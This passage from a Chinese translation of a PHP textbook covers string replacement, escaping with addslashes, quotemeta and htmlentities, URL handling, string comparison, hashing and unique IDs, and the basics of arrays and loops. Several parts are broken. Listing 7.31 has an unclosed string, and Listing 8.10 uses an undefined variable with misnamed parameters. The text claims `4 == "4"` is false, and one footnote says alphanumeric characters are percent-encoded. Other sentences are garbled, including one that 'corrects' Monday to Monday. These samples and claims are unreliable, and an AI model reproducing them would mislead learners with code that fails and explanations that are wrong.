结果为 true。

相关函数 str_starts_with(String, search string) 和 str_ends_with(String, search string) 将字符串的开头或结尾与搜索字符串进行比较。只有在绝对匹配时才返回 true。

在下面的示例中，两种情况都返回 true。

```php
$a = "The blue riders.";
var_dump(str_starts_with($a, "The"));
var_dump(str_ends_with($a, "."));
```

清单 7.23 "str_starts_with()" 和 "str_ends_with()" ("str_starts_ends_with.php")





### 7.5.2 替换

此外还有几个用于替换字符串部分的函数。它们主要在替换范围上有所不同。

### 按位置替换

substr_replace(String, replacement, start position, length) 函数与其小兄弟 substr() 的工作方式类似，区别在于指定范围不是被切割，而是被替换。长度是可选的，且起始位置和长度均可以是负数。

以下脚本将 red 替换为 blue。

```php
<?php
$a = "The red riders.";
echo substr_replace($a, "blue", 4, 3);
?>
```

### 列表 7.24 "substr_replace()" ("substr_replace.php")

### 查找和替换

str_replace(search string, replacement, string) 函数是使用正则表达式进行查找和替换的“小巧”替代方案。它有几个优点：基于二进制比较，性能好，且易于记忆。第一个参数包含查找字符串。第二个参数包含找到位置的替换内容，第三个参数是进行查找和替换的字符串。

```php
<?php
$a = "Jippiieejoy";
echo str_replace("e", "i", $a);
?>
```

### 列表 7.25 "str_replace()" ("str_replace.php")

> **注意**
> 遗憾的是，PHP 字符串函数的参数顺序并未标准化。例如，在此处，待处理字符串位于最后。

在上面的代码中，所有的 ‘e’ 都被替换为 ‘i’。

> **提示**
> 例如，快速查找和替换非常适合用于代码中的占位符。

除了简单字符串，`str_replace()` 还支持所有三个参数使用数组。在列表 7.26 和图 7.14 中，您可以看到一个示例。

```php
<?php
$a = "Jippieejey";
$b = "Holadrioe";
$result = str_replace(array("e", "o"), array("i", "ö"), array($a, $b));
print_r($result);
?>
```

### 列表 7.26 带数组的“str_replace()” (“str_replace_array.php”)

![](img/ae7820c36e8f24c1623d26668b28e80e_220_0.png)

## 图 7.14 狂野字符串切换

> **注意**
> str_ireplace(search string, replacement, string) 是 str_replace() 的不区分大小写变体，其余构造完全相同。

### 替换多个字符

`strtr(String, From, In)` 函数的工作方式类似于 `strpbrk()`。它搜索字符串（From）中指定的字符，并将其替换为第二个字符串（In）中输入的字符。请参阅以下简单示例。

```php
<?php
$a = "Jippieejey";
echo strtr($a, "ei", "ie");
?>
```

### 列表 7.27 “strtr()” 的用法 (“strtr.php”)

在此处，Jippieejey 变为 Jeppiiijiy。

> **注意**
> 如果 From 字符串和 In 字符串中的字符数量不相同，则一方多余的字符将被忽略。

strtr(String, Array) 还有一种带关联数组的第二种语法。在此情况下，相应数组元素的键是 From，值是 In。因此，以下脚本与列表 7.27 的效果相同，但使用了关联数组。

```php
<?php
$a = "Jippiieejey";
echo strtr($a, array("e"=>"i", "i"=>"e"));
?>
```

### 列表 7.28 带关联数组的 "strtr()" ("strtr_asso.php")

## 7.6 特殊字符、HTML 及类似内容

无论您是使用 HTML、数据库查询还是文件，都始终会遇到特殊字符。PHP 已针对最重要的应用领域提供了现成的函数。

### 7.6.1 数据库转义

对于数据库查询，您必须转义某些字符。11 这是通过反斜杠（\）完成的。addslashes(String) 函数在单引号和双引号、反斜杠以及空值之前插入反斜杠。当您将字符串作为值写入数据库时，通常会使用此函数，以便上述字符不会被 SQL 解释为属于语法。然而，PHP 中的大多数数据库接口都有自己的转义函数。这些函数通常优于 addslashes()。

要撤销 addslashes(String)，请使用 stripslashes(String)。以下简单示例同时使用了这两个函数。

```php
<?php
$a = 'Caesar said: "I came, I saw, I conquered!"';
$a = addslashes($a);
echo "With backslash: " . $a;
$a = stripslashes($a);
echo "<br />Without: " . $a;
?>
```

11 顺便说一句，此过程可以使用多种术语。除了转义，还可以使用屏蔽甚至注释掉。

### 列表 7.29 使用反斜杠转义 ("addslashes.php")

比 addslashes() 略微灵活一些的是 addcslashes(string, character) 函数。它会在字符串 character 中指定为参数的所有字符前添加反斜杠。

`addcslashes($a, " 'n")` 因此会在双引号和 n 字符前放置反斜杠（参见图 7.15）。

![](img/ae7820c36e8f24c1623d26668b28e80e_222_0.png)

## 图 7.15 顶部带有反斜杠，底部没有

> **注意**
>
> 反向转换使用 stripslashes(String) 执行。但是，诸如 \n 之类的特殊字符会被忽略。这意味着，如果您使用 addcslashes($a, 'n')，在反向转换后源代码中仍会有换行符，而不是所有的 n。如果要避免此效果，请使用 stripslashes()。这将删除所有反斜杠。

### 7.6.2 正则表达式转义

与 SQL 类似，正则表达式使用其自身的特殊字符，因此应在字符串中对其进行转义。quotemeta(String) 函数负责此操作。12 以下字符将使用反斜杠进行转义：

- .
- \
- *
- +
- ?
- [
- ^
- ]
- (
- $
- )

请参阅以下简单示例。

```php
<?php
$a = "Results in 50 * (5 - 3) 100?";
echo quotemeta($a);
?>
```

### 列表 7.30 "quotemeta()" ("quotemeta.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_223_0.png)

## 图 7.16 所有相关字符均已注释掉

> **提示**
> 要转换回来，只需使用 stripslashes()。

### 7.6.3 HTML

HTML 是一种特殊的——或者也可以说是奇怪的——语言。按定义，浏览器不识别不适合简单字符集的任何内容。特殊字符可使用实体13。例如，这些包括德语变音符号。PHP 专门提供了几个用于处理特殊字符的函数。

#### 转换特殊字符

htmlentities(String) 函数可以将字符串中所有与 HTML 相关的特殊字符进行转换。在以下列表中，我们比较了带转换和不带转换的变音符号及双引号。

```php
<?php
$a = 'Umlauts: "Ä", "ä", "Ö", "ö", "Ü", "ü"; echo "Without conversion: " . $a . "<br />\n";
echo "With conversion: " . htmlentities($a);
?>
```

### 列表 7.31 带转换和不带转换 ("html.php")

13 此处的实体应理解为充当特殊字符占位符的预制字符串。HTML 中的实体始终以 & 开头并以分号结尾。例如，&auml; 表示 ä。缩写甚至很容易理解：auml 表示 a umlaut。

在默认语言设置为德语的浏览器中，两种变体显示相同。在默认语言设置为英语的浏览器中则不是这样。但是，您已经可以在源代码中看到差异（参见图 7.17）。引号和变音符号已变为 HTML 实体。

![](img/ae7820c36e8f24c1623d26668b28e80e_224_0.png)

![](img/ae7820c36e8f24c1623d26668b28e80e_224_1.png)

## 图 7.17 将变音符号转换为 HTML 特殊字符

> 例如，如果您正在开发留言本，则在输出之前应始终将用户输入转换为特殊 HTML 字符。这也会删除用户使用的任何 HTML 标签，这些标签可能会破坏页面布局14，甚至被用于恶意脚本。15 如果您希望在留言本中允许格式化，则必须进行更精确的过滤。

htmlentities(string, quotation marks, character set) 提供两个可选参数。对于引号，您可以在常量中设置如何处理双引号和单引号：

- ENT_QUOTES 转换所有引号。
- ENT_NOQUOTES 保持所有引号不变。
- ENT_COMPAT 仅将双引号转换为 HTML 特殊字符。这是默认值。

`htmlentities($a, ENT_NOQUOTES)` 防止引号被转换。您将在源文本中看到双引号，而不是 &quot;。

14 在 Web 安全方面，这被称为篡改。
15 这称为跨站点脚本。





第三个参数允许使用指定字符集进行转换。其默认值为 ISO-8859-1。其他值可在表 7.1 中找到。

| 字符集 | 替代名称 | 描述 |
|---|---|---|
| ISO-8859-1 | ISO8859-1 | 西欧，Latin-1 |
| ISO-8859-15 | ISO8859-15 | 西欧，Latin-9；与 ISO-8859-1 相比的新增内容：欧元字符、法语重音、斯堪的纳维亚字母 |
| UTF-8 | | 8 位 Unicode |
| cp866 | ibm866, 866 | 西里尔字符集 |
| cp1251 | Windows-1251, win-1251, 1251 | Windows 的西里尔字符集 |
| cp1252 | Windows-1252, 1252 | Windows 西欧字符集 |
| KOI8-R | koi8-ru, koi8r | 俄语字符集 |
| BIG5 | 950 | 繁体中文（台湾） |
| BIG5-HKSCS | | 带香港扩展的繁体中文 |
| GB2312 | 936 | 简体中文 |
| Shift_JIS | SJIS, 932 | 日语 |
| EUC-JP | EUCJP | 日语 |

## 表 7.1 字符集

htmlspecialchars(String, quotation marks, character set) 的工作原理与 htmlentities() 完全相同，但不会转换所有 HTML 特殊字符。将转换以下内容：

```
< > ' " &
```

例如，不包括德语变音字母。为什么会有精简版？尤其是在英语国家，通常没有必要或不希望对所有特殊字符进行完全转换。htmlspecialchars() 转换的实体也是 HTML 语法中的关键字符。

## 将特殊字符转换回来

反过来：将 HTML 特殊字符转换回普通字符串。为此，PHP 提供了 html_entity_decode(String, quotation marks, character set) 函数。它使用与 htmlentities() 相同的参数。

```php
<?php
$a = "&lt;p&gt;Text in paragraph with&lt;br /&gt; line break&lt;/p&gt;";
echo html_entity_decode($a);
?>
```

### 清单 7.32 "html_entity_decode()" ("html_entity_decode.php")

### 转换表

使用 htmlentities() 或 htmlspecialchars() 进行转换是基于 PHP 中存储的表。您可以使用 get_html_translation_table(version, quotes) 函数读取此表，以了解发生了什么。

两个参数均为可选。如果省略 version，则返回 htmlspecialchars() 的条目（这对应于值 0）；如果输入 1，则返回 htmlentities() 的（显著更长的）列表（参见图 7.18）。

![](img/ae7820c36e8f24c1623d26668b28e80e_226_0.png)

### 图 7.18 "htmlentities()" 的列表（左侧）和 "htmlspecialchars()" 的列表（右侧）

> **注意**
>
> 此处使用 htmlentities() 对返回的键和值进行屏蔽，以便它们在浏览器中按原样显示。

返回格式是一个关联数组。键是原始值；值是转换的目标。对于第三个参数 quotation_marks，请从三个已知选项中选择（参见前面关于转换特殊字符的章节）。

```php
<?php
$table = get_html_translation_table();
foreach ($table as $key => $value) {
	echo htmlentities($key) . " becomes " . htmlentities($value) .
	"<br />";
}
?>
```

### 清单 7.33 "get_html_translation_table() ("html_table.php")"

### 移除标签

strip_tags(String, Protected) 函数从字符串中移除 PHP 和 HTML 标签，而不替换它们。在 Protected 字符串中，依次输入要在替换前保留的标签。注意：标签不能采用 XHTML 表示法，且只能使用开始标签！大写和小写字母则没有区别。

在以下示例中，段落（<p> 和 </p>）被移除，但换行（<br />）被保留：

```php
$a = "<p>Text in paragraph with<br /> line break</p>";
echo strip_tags($a, "<BR>");
```

### 7.6.4 URLs

URL（即网址）允许附加其他信息。这些信息跟在文件名和问号之后。但是，这种格式有特定要求。16 要创建此格式，请使用 urlencode(String)。要将 URL 转换回来，请使用 urldecode(URL)。图 7.19 显示了一个示例。

```php
<?php
$rheinwerk = "http://www.rheinwerk-verlag.de/index.php?";
$anhang = "Index 1=Value 1&Index 2=Value 2";
echo $rheinwerk . urlencode($anhang);
?>
```

### 清单 7.34 "urlencode() ("urls.php")"

16 英数字符变为百分号（%），后跟一个两字符的十六进制代码。空格变为加号。

![](img/ae7820c36e8f24c1623d26668b28e80e_228_0.png)

### 图 7.19 附件具有 URL 兼容格式

> > **提示**
> > 在实际操作中，如果要将较长的字符串（例如用户输入）附加到 URL，则需要此功能。

### 拆分 URL

如果您需要 URL 的各个部分（域名、主机名等），可以使用 parse_url(URL)。您只需将 URL 作为字符串传递，即可获取包含所有组件的关联数组。

```php
<?php
$url = "http://www.rheinwerk-verlag.de/index.php?Index+1%3DValue+1%26Index+2%3DValue+2";
$items = parse_url($url);
print_r($items);
?>
```

### 清单 7.35 "parse_url()" ("parse_url.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_228_1.png)

### 图 7.20 将 URL 分解为各部分的数组

## 7.7 比较

您已经知道第 5 章中的简单字符串比较。使用精确相等和精确不等，甚至可以检查数据类型。

```
4 == "4"
```

因此结果为 false。

PHP 的字符串函数现在提供了一些超出此基本检查的其他比较。

### 7.7.1 比较函数

strcmp(String1, String2) 和 strcasecmp(String1, String2) 函数用于对两个字符串进行二进制比较。唯一的区别是 strcasecmp() 不区分大小写。与使用相应比较运算符进行比较不同，这些函数返回哪个字符串更大的结果。如果 String1 更小，则返回值小于 0；如果两个字符串相同，则返回值为 0；如果 String1 更大，则返回值大于 0。

> > **注意**
> >
> > 还有一个比较函数仅对两个字符串的部分进行相互比较：substr_compare(String1, String2, Start, Length, Case-sensitive)。必需参数是两个字符串以及要从中进行比较的位置。长度（即要比较的字符数）是可选的。自 PHP 5.6 起，也允许值 0。另一个可选参数是布尔参数 Case-sensitive，false 会禁用大小写区分（默认值为 true）。

### 7.7.2 相似性与差异

量化字符串之间的相似性或差异不仅在您想确定懒惰的作者（小学生、学生、教授等）是否抄袭时才有用。

#### 相似性

similar_text(String1, String2, percent) 函数计算两个字符串之间的相似性。可选地，您可以为第三个参数指定一个变量（作为引用）。然后函数将比较结果作为百分比值写入该变量。函数的返回值不如百分比有意义。它指示有多少个字母被识别为相同。

```php
<?php
$a = "PHP is powerful";
$b = "All power to PHP!";
$e;
echo "Value: " . similar_text($a, $b, $e) . "<br />";
echo "Percent: " . $e;
?>
```

### 清单 7.36 "similar_text()" ("similar_text.php")

前一个清单中的两个字符串相似度为 37.5%。

#### 差异

levenshtein(String1, String2) 的工作方式与 similar_text() 类似。同样比较两个字符串——这次是根据 Levenshtein 算法——并返回距离（即字符串之间的差异）。但是，字符串最长只能为 255 个字符。

### 7.7.3 发音

如果某人在文本字段中写入一个值，拼写可能不正确。这对程序员来说很不愉快，因为他必须考虑许多拼写错误。然而，许多拼写错误是因为人们按照说话方式书写。PHP 通过 soundex(String) 函数提供了一个很好的解决方案，该函数比较两个字符串以查看它们是否发音相似或相同。17

例如，如果要求输入 Good morning，普通字符串比较会返回 Got morning 不相同。而 soundex() 则为两者返回相同的键（参见图 7.21）。

```php
<?php
$a = "Good morning";
$b = "Got morning";
echo $a . ": " . soundex($a) . "<br />";
echo $b . ": " . soundex($b);
?>
```

### 清单 7.37 "soundex()" ("soundex.php")

17 根据 PHP 文档，该函数基于 Donald Knuth 来自《计算机程序设计艺术》第 3 卷《排序与搜索》（Addison-Wesley，1973），第 391 页及以下的 Soundex 算法。但是，Soundex 最初源于 Robert C. Russell 于 1918 年 4 月 2 日在美国申请并注册号为 1,261,167 的专利算法。





![](img/ae7820c36e8f24c1623d26668b28e80e_231_0.png)

图 7.21 两个表达式几乎听起来一样

## 7.8 有用信息

本节是所有过于重要、不能缺少示例，但又不太适合放入任何主题章节的函数的存放库。

### 7.8.1 ASCII 与转换

计算机将数据存储为字节。一个字节的值在 0 到 255 之间。ASCII 字符码表示该值范围内的字母和字符。这意味着，如果字节具有数值，则可以使用数值代码来确定哪个字符与其匹配。尽管 ASCII 是一个旧字符集，且 UTF-8 字符集现在越来越多地用于浏览器和 HTML 文档中，但你有时仍然需要字符或字母的 ASCII 代码。PHP 提供了两个函数来实现此目的：

- chr(ASCII) 将 ASCII 代码转换为相应的字符。
- ord(character) 返回相应字符的 ASCII 代码。

```
<?php
echo "Character: " . chr(65) . "<br />";
echo "ASCII: " . ord("A");
?>
```

清单 7.38 "chr()" 和 "ord()" ("chr_ord.php")

### 7.8.2 Unicode 码点

码点是字符集中的一个值。因此，Unicode 码点是 Unicode 字符集中的一个值。这些值通常以 0 到 10FFFF 的十六进制形式指定（参见图 7.22）。通过 \u，PHP 现在提供了一种将此类值转换为相应的 UTF-8 字符并将其输出的方法。

![](img/ae7820c36e8f24c1623d26668b28e80e_232_0.png)

图 7.22 Windows 字符表也显示十六进制代码

```
$result = "\u{00ae}";
echo $result;
```

清单 7.39 使用 "\u" 进行 Unicode 转换 ("unicode_codepoint.php")

### 7.8.3 加密

对于加密或哈希，PHP 提供了多种不同加密技术的函数：

- md5(String) 计算字符串的 MD5 哈希值，这是一个长度为 32 个字符的十六进制数。
- md5_file(filename) 从文件名计算 MD5 哈希值。

> **注释**
> 这两个函数的第二个参数是一个布尔值，用于确定返回值是数字（false，默认值）还是长度为 16 个字符的二进制数据（true）。

- sha1(String) 和 sha1_file(filename) 的工作方式与 md5() 和 md5_file() 相同，只是它们使用美国安全哈希算法 1 而非 MD5 进行加密。

18 相关算法在 www.ietf.org/rfc/rfc1321.txt 中标准化。该算法最初由麻省理工学院教授 Ronald L. Rivest 发明。
19 详细信息可在 www.ietf.org/rfc/rfc3174.txt 中找到。

- crypt(String, Salt) 生成字符串的 DES 加密。根据系统不同，使用的算法也不同。但这始终是单向加密，无法解密。你可以将盐值作为可选参数指定。

- 与 crypt() 哈希类似且兼容的是 password_hash(password, algorithm, options)。它可用于使用各种算法实现密码哈希。默认使用 bcrypt；自 PHP 7.2 起，Argon2i 也是一种选择，自 PHP 7.3 起支持 Argon2id。在选项的关联数组中，可以指定自己的盐值，但根据加密方法的不同，建议使用函数本身生成的随机默认值。

- hash(Algorithm, String) 允许使用可定义的算法计算哈希值。例如，可用于计算 sha256。只需将算法作为字符串输入即可。顺便说一句，md5 也可在此处使用。

> **提示**
> 使用 mcrypt 库（http://s-prs.co/v602268）可以获得更多——更安全且可自定义的加密。

### 应用：唯一 ID

例如，如果你想创建自己的会话管理来识别用户，或唯一标识任何其他元素，则需要唯一 ID。计算唯一 ID 有很多想法和脚本。最佳且最简短的建议之一来自前 PHP 共同开发者 Sterling Hughes：

```
$uid = md5(uniqid(microtime(), 1));
```

uniqid() 函数使用当前日期以秒为单位计算 ID。然后从中生成 32 位 MD5 哈希值。如果你还想排除另一台服务器生成相同 ID 的微小可能性，请在字符串中包含当前 PHP 进程的唯一进程 ID：

```
$uid = substr($uid, 0, 16) . getmypid() . substr($uid, 16, 16);
```

以下清单显示了完整的脚本（另见图 7.23）。

```
<?php
$uid = md5(uniqid(microtime(), 1));
$uid = substr($uid, 0, 16) . getmypid() . substr($uid, 16, 16);
echo $uid;
?>
```

清单 7.40 唯一 ID ("uniqueid.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_234_0.png)

图 7.23 唯一 ID

### 7.8.4 字符串翻转

strrev(String) 反转字符串（另见图 7.24）。此函数很少使用，但有时非常实用。

```
<?php
$a = "PHP is great";
echo strrev($a);
?>
```

清单 7.41 "strrev()" ("strrev.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_234_1.png)

图 7.24 已翻转的字符串

### 7.8.5 多字节字符串函数

如果你正在开发多语言应用程序，可能需要多字节字符串函数。这些函数在功能和内容上与标准字符串函数大体相同。因此，此处不会有单独的说明。不过，它们的特殊之处在于，它们可以处理无法完全存储在具有八位的字节中的字符，即超出 UTF-8 标准的字符。

> **提示**
> mbstring 可能编码的概览可在 http://s-prs.co/v602212 中找到。

这些函数集中在名为 mbstring 的扩展中。要在 Linux 下激活它们，请使用以下开关编译 PHP：

```
--enable-mbstring
```

在 Windows 下，在 php.ini 中激活该扩展。以下是 PHP 7.2 的变体：

```
extension=mbstring
```

在较旧的 PHP 版本中，仍需为 Windows 添加 .dll 扩展。然后可以使用 phpinfo() 检查设置是否成功（参见图 7.25）。大多数安装包也内置了 mbstring。

| 多字节支持 | 启用 |
| --- | --- |
| 多字节字符串引擎 | libmbfl |
| HTTP 输入编码转换 | 禁用 |
| libmbfl 版本 | 1.3.2 |
| oniguruma 版本 | 6.9.0 |

图 7.25 已安装 mbstring

在最新的 PHP 版本中，mbstring 已持续开发。特别是 PHP 7.3 在性能改进方面迈出了重要一步，因为如果你不需要多字节字符语言，那么普通字符串函数自然要快得多。

PHP 7.3 还改进了大小写处理。PHP 7.1 中已添加了改进的错误处理。与许多 PHP 扩展一样，现在抛出的致命错误更少，但可捕获的错误更多。

# 第 8 章
数组

*数组是任何编程语言中非常重要的数据类型。*
*数组存储多个数据值，你可以随时再次访问这些值。*

在 PHP 中，数组尤其灵活，因为它们可以容纳任何数据类型，甚至不同的数据类型。原因在于，除非明确启用，否则 PHP 不使用严格类型。

> **注释**
> 其他编程语言将数组限制为一种数据类型（包括向量数组）。例如，有此类结构。PHP 中的数组类似于 Perl 中的哈希，但语法上有细微差别。

数组在 PHP 本身中也非常常见。例如，存储表单元素值的 $_POST 和 $_GET 超全局变量也是数组。数据库返回结果也经常存储在数组中。

本章将介绍数组的基础知识，然后向你展示如何利用 PHP 提供的众多数组函数和可能性快速且轻松地上手。

## 8.1 基础

数组可以存储任意数量的数据。这些数据在数组中一个接一个地排列。索引用于标识数据。数组的索引从 0 开始，因此第一个元素的索引为 0，第二个为 1，第三个为 2。

### 8.1.1 创建数组

使用 array() 函数创建数组。你也可以创建一个不含元素的空数组：

```
$days = array();
```

现在 $days 变量是一个数组。如果你想立即用元素填充数组，请在圆括号中写入元素并用逗号分隔：

```
$days = array("Monday", "Tuesday", "Wednesday");
```



**注意**
如已所述，也可以混合数据类型：

$mix = array(2, "Text", true);

要查看数组的内容，可以使用 print_r() 或 var_dump() 函数（参见图 8.1）。

```php
print_r($days);
```

![](img/ae7820c36e8f24c1623d26668b28e80e_238_0.png)

图 8.1 数组

但是，还有其他创建数组的方法。也可以直接向变量分配索引。这总是使用方括号（[]）完成：

```php
$days[0] = "Monday";
```

这与许多其他语言不同。在 PHP 中，不必单独定义数组。可以简单地将任何变量转换为数组。

**注意**
如果变量已有数据类型，则自动转换为数组无法工作。下面是一个示例：在以下脚本中，$days 已经是一个值为 Saturday 的字符串。如果现在使用方括号访问索引 0，则旧变量的第一个字符将被 M 替换。因此输出为 Maturday（参见图 8.2），如果不使用 @ 抑制，PHP 将显示错误信息。

```php
<?php
$days = "Saturday";
@$days[0]= "Monday";
print_r($days);
?>
```

清单 8.1 变量已存在（"array_direct.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_239_0.png)

图 8.2 "Saturday" 变为 "Maturday"

### 8.1.2 添加和更改元素

使用数组时最重要的是使用方括号的语法。这样可以访问数组的任何索引。过程始终相同：

```php
$name[Index]
```

如果要赋值，请使用赋值运算符（=）：

```php
$name[Index] = Value;
```

请看一个简单的示例。在以下脚本中（输出如图 8.3 所示），首先在末尾添加一个新元素，然后将第三个元素 Monday 修正为 Monday。

```php
<?php
$days = array("Saturday", "Sunday", "Monday", "Tuesday");
$days[4] = "Wednesday";
$days[2] = "Monday";
print_r($days);
?>
```

清单 8.2 更改和添加元素（"array_change.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_239_1.png)

图 8.3 更改后的数组

**提示**
如果赋值时未指定索引，则元素会添加到数组末尾，并分配最高的数值索引：
`$name[] = value;`

### 8.1.3 删除元素

要删除元素，请使用 `unset()`。同样，也可以使用它来删除整个数组，如图 8.4 所示。

```php
<?php
$days = array("Saturday", "Sunday", "Monday", "Tuesday");
unset($days[0]);
print_r($days);
unset($days);
print_r($days);
?>
```

清单 8.3 “unset()”（"unset.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_240_0.png)

图 8.4 先是一个元素消失，然后是整个数组

### 8.1.4 关联数组

关联数组是索引由字符串或描述性名称组成的数组。下面是一个简单示例：

```php
$stockprices = array("IBM" => 232, "Siemens" => 34, "Rheinwerk" => 340);
```

索引使用 => 分配给名称。请注意：这很容易与面向对象编程中的 -> 运算符混淆！

> **注意**
> 
> 在 PHP 内部，所有数组都是关联数组。这意味着数值索引仅被赋予特殊角色。这种行为也使混合数值索引和关联索引成为可能。

使用方括号（参见图 8.5），也可以为索引使用自定义名称：

```php
$stockprices = array("IBM" => 232, "Siemens" => 34, "Rheinwerk" => 340);
$stockprices ["Forsche"] = 53;
print_r($stockprices);
```

![](img/ae7820c36e8f24c1623d26668b28e80e_241_0.png)

### 8.1.5 JSON 简写法

在 PHP 中，还有另一种数组表示法，它基于 JavaScript Object Notation (JSON) 的表示法。这里只需使用方括号创建数组：

```php
$days = ["Monday", "Tuesday", "Wednesday"];
```

当然，这样尤其简洁。创建关联数组的方法同样简单：

```php
$stockprices = ["IBM" => 232, "Siemens" => 34, "Rheinwerk" => 340];
```

效果与其他表示法相同。

### 8.1.6 多维数组

简单来说，多维数组就是“嵌套”数组。只需将一个数组作为元素值插入到另一个数组中。可以直接这样做：

```php
$stockprices = array("IBM" => array("1.1.2020" => 232, "1.1.2025" => 254));
```

或者也可以先将数组保存在变量中：

```php
$ibw_stockprice = array("1.1.2020" => 232, "1.1.2025" => 254);
$stockprices = array("IBM" => $ibw_stockprice);
```

然后可以使用方括号语法访问关联数组的元素：

```php
$stockprices["IBM"]["1.1.2020"]
```

例如，最后一行访问 2020 年 1 月 1 日 IBM 股票的价格。该值输出 232。某些 PHP 函数（例如 array_walk_recursive()）会递归遍历多维数组。在这里，递归意味着所有子数组及其元素也会被遍历。

## 8.2 数组和循环

方括号可用于访问数组的单个元素。但在实际操作中，最常见的任务是遍历数组。这种遍历通常通过循环来实现。但是，也有一些函数可以作为替代方案。

在介绍具体解决方案之前，先谈谈 PHP 中的数组。如前所述，带有数值索引的数组实际上是关联数组。在内部，索引和值是按添加到数组的顺序存储的。我们将在输出顺序部分立即讨论这一点。

### 8.2.1 "for"

for 循环只需按索引顺序遍历数值数组。为此，必须使用 count(Array) 函数确定数组包含多少个元素。然后启动 for 循环（参见图 8.6）。

```php
<?php
$days = array("Saturday", "Sunday", "Monday", "Tuesday");
for ($i = 0; $i < count($days); $i++) {
    print $days[$i] . "<br />";
}
?>
```

清单 8.4 数组的 "for" 循环（"array_for.php"）

for 循环效果不错，但仅在满足以下两个条件时才适用：

- 数组没有关联索引，只有数值索引。
- 数组没有间隙；也就是说，索引数字之间没有缺少的索引。例如，下面的数组在按照前面的模式读取时会生成警告，并且不再输出 Tuesday，因为 count() 将返回值 4，而最后一个元素没有索引 3：

```php
$days = array("Saturday", "Sunday", "Monday", 4=>"Tuesday");
```

foreach 更适合不满足这些条件的情况。

![](img/ae7820c36e8f24c1623d26668b28e80e_243_0.png)

图 8.6 元素按索引顺序输出

### 8.2.2 "foreach"

使用 foreach 循环，可以遍历数组的所有元素，无论它们具有数值索引还是关联索引。下面的循环会依次输出数组的所有元素，如图 8.7 所示。

```php
<?php
$days = array("Saturday", "Sunday", "Monday", "Tuesday");
foreach ($days as $day) {
    print $day . "<br />";
}
?>
```

清单 8.5 使用 "foreach" 遍历数组（"array_foreach.php"）

![](img/ae7820c36e8f24c1623d26668b28e80e_243_1.png)

图 8.7 输出数组的元素

> **注意**
> 
> 默认情况下，值作为副本可用；也就是说，无法更改字符串。但是，如果要更改值，也可以将其作为引用传递，前面加上 & 符号：
> 
> ```php
> foreach ($days as &$day) {
> $day = "<p>" . $day . "</p>";
> }
> ```

但是，如果以不同于数值顺序的顺序将元素插入数组怎么办？请考虑以下示例，其中 Monday 在 Sunday 之前定义，尽管 Sunday 的索引较低。

```php
<?php
$days = array();
$days[0] = "Saturday";
$days[2] = "Monday";
$days[1] = "Sunday";
$days[3] = "Tuesday";

foreach ($days as $day) {
  print $day . "<br />";
}
?>
```

清单 8.6 按输入顺序使用的 “foreach”（"array_foreach_sequence.php"）

如图 8.8 所示，输入顺序对 foreach 至关重要。因为 Monday 在 Sunday 之前插入数组，所以它也会在 Sunday 之前输出。

![](img/ae7820c36e8f24c1623d26668b28e80e_244_0.png)

图 8.8 输入顺序至关重要





> **注意**
> 在这种情况下，如果没有关联索引，使用for循环可以解决问题。但是，PHP提供了许多其他排序函数。

使用PHP的关联数组时，你可能不仅想获取值，还想获取值的索引。同样，foreach提供了出色的服务，如图8.9所示。

```php
<?php
$stockprices = array("IBW" => 232, "Miemens" => 34, "Rheinwerk" => 340);
foreach ($stockprices as $index => $stockprice) {
print "The company " . $index . " ";
print "has the stock price: " . $stockprice . "<br />";
}
?>
```

### 清单8.7 使用foreach读取索引 ("array_foreach_index.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_245_0.png)

### 图8.9 索引也可以输出

> **注意**
> 自PHP 7.1以来，你也可以在foreach循环中使用基于JSON的简写表示法中的数组。以下示例展示了没有对象的JSON数组的变体。

```php
<?php
$stockprices = [
["IBW", 232],
["Miemens", 34],
["Rheinwerk", 340]
];
foreach ($stockprices as [$index, $stockprice]) {
print "The company " . $index . " ";
print "has the stock price: " . $stockprice . "<br />";
}
?>
```

### 清单8.8 带有JSON表示法的"foreach" ("array_foreach_abbreviation.php")

### 8.2.3 用于迭代的函数

除了循环，PHP还提供了一些你可以用来遍历数组的函数。其背后的概念是一种指向数组当前元素的指针。<sup>1</sup>

例如，使用current(Array)函数，你可以获取当前元素。而使用next(Array)，指针则移动一个元素，你将获取该元素。如果没有剩余元素，你将收到值false。

以下简单示例遍历数组的所有元素（参见图8.10）。

```php
<?php
$stockprices = array("IBW" => 232, "Miemens" => 34, "Rheinwerk" => 340);
print current($stockprices) . "<br />";
while (next($stockprices)) {
    print current($stockprices) . "<br />";
}
?>
```

清单8.9 "current()"和"next()" ("current_next.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_246_0.png)

**图8.10 所有股票价格**

> **注意**
> 注意：如果数组中的一个值为false或0，刚才显示的方法就会失败！在这种情况下，即使数组尚未遍历完，while循环也会中止。但是，如果你检查绝对不等式，至少可以排除值0：
> while (next($rates) != false) { ... }

1 PHP不像其他编程语言（例如C）那样具有真正的指针概念。但是，提到的函数在某种程度上接近这个概念。

除了这两个函数之外，还有几个其他用于迭代的函数：

- pos(Array)是current()的同义词。
- prev(Array)返回当前元素之前的数组元素。如果没有更多元素，则返回false。
- reset(Array)将指针重置回第一个元素。如果数组为空，函数返回false。
- end(Array)将指针设置到最后一个元素。如果数组为空，函数返回false。
- each(Array)的工作方式类似于next()，不同之处在于键和值以数组形式返回。但是，自PHP 7.2起不再推荐使用该函数，并且已从PHP 8中删除。
- key(Array)返回数组中当前指针位置处元素的索引。
- array_walk(Array, Function, Parameter)会自动遍历数组，并为每个元素调用一个函数。该函数将相应元素的值和索引作为参数接收。可选地，你也可以传递第三个参数。使用array_walk()时，不应更改数组。输出按元素的输入顺序排列。这对所有迭代函数都适用。array_walk_recursive()的工作方式与array_walk()相同，不同之处在于它还会穿透多维数组。以下清单提供了array_walk()的简单示例；你可以在图8.11中看到输出。

```php
<?php
$stockprices = array("IBW" => 232, "Miemens" => 34, "Rheinwerk" => 340);

function output($stockprices, $index, $text) {
if ($index != "Miemens") {
print $text . $index . ": ";
print $rate . "<br />";
}
}

array_walk($stockprices, "output", "The stock price from: ");
?>
```

### 清单8.10 "array_walk()" ("array_walk.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_247_0.png)

### 图8.11 该函数返回两个价格并挑出一个

